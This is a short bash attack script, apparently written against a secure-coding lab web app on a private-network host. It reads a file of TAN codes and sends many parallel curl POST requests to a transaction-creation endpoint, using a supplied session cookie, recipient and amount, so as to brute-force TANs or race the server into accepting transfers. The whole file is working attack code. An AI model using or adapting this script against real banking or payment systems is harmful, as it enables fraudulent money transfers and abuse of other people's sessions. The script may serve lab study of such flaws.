#!/bin/bash
# usage: bomb_transaction.sh tans.txt [sessionid] [recipient] [amount]
while IFS='' read -r line || [[ -n "$line" ]]; do
    curl 'http://192.168.178.76/secure-coding/public/create_transaction.php' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H "Cookie: PHPSESSID=$2" \
    -H 'Connection: keep-alive' --data "recipient=$3&amount=$4&tan=$line&submit=" --compressed &
done < "$1"